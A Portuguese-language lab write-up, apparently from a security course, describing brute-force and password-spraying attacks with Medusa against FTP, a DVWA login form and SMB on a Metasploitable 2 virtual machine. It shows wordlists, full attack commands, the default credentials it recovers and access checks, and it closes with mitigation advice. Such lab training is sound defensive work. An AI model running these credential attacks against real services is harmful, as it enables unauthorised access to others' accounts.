# Testes e Simulações de Ataque (Medusa)

Este documento descreve os ataques realizados com Medusa em serviços comuns (FTP, HTTP/DVWA e SMB), as wordlists usadas, os comandos executados e as verificações de acesso.

---

## 1) Ataque de força bruta em FTP (Metasploitable 2)

### Serviço alvo

- O serviço FTP possui a porta padrão: `21`
- Conta conhecida em Metasploitable 2: `msfadmin:msfadmin`
- Wordlists usadas `users.txt` e `passwords.txt`

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > passwords.txt
```

### Comando de exemplo

```bash
sudo medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp
```

![](/images/medusa_brute_force.png)

Encontramos o usuário e senha do Metasploitable 2: `msfadmin:msfadmin`

### Validação de sucesso

- O Medusa deve relatar `LOGIN SUCCESSFUL`.
- Agora podemos verificar o acesso usando um cliente FTP:

```bash
ftp 192.168.56.102
# login: msfadmin / msfadmin
```
![](/images/ftp_autenticacao.png)

---

## 2) Força bruta em formulário web (DVWA)

Abra a página na VM da Kali Linux:
http://192.168.56.102/dvwa/login.php
- Acesse a aba Network na opção de desenvolvimento do browser (F12)
- Insira um Usuário e senha fictício na página
- Clique em um método enviado (POST)
- Clicando na aba request, podemos ver os parâmetros de requisição

![](/images/parametros_de_requisicao.png)

### Exemplo de comando
```bash
medusa -h 192.168.56.102 -U users.txt -P passswords.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6 | gre 'SUCCESS'
```
![](/images/brute_force_form_web.png)

### Validação de sucesso

- Medusa exibirá `LOGIN SUCCESSFUL`.
- Podemos acessar manualmente o formulário para verificar se conseguimos entrar com as credenciais encontradas.

---

## 3) Password spraying em SMB com enumeração de usuários

O Password spraying usa uma lista pequena de senhas contra vários usuários comuns, evitando bloqueio de conta.

### Serviço alvo

- O serviço SMB possui a porta padrão: `445`
- Usuário conhecido em Metasploitable 2: `msfadmin`
- Wordlists utilizadas `users.txt` e `passwords.txt`

### Comando de exemplo

```bash
sudo medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M smbnt
```

### Validação de acesso

- Medusa deve indicar `LOGIN SUCCESSFUL` para um par usuário/senha válido.
- Agora podemos testar com `smbclient`:

```bash
smbclient -L //192.168.56.102 -U msfadmin
# senha: msfadmin
```

---

## 4) Recomendações de mitigação

### Para usuários: Proteção de senhas

- Use senhas fortes e únicas.
- Evite senhas padrão em diferentes serviços.

### Para Administradores: Proteção contra força bruta

- Implementar **bloqueio de conta** temporário após N tentativas falhas.
- Ativar delays entre tentativas de autenticação.
- Monitorar logs de autenticação (SSH, FTP, SMB, apps web).
- Isolar servidores críticos em redes separadas.
- Permitir acesso apenas dos sistemas necessários
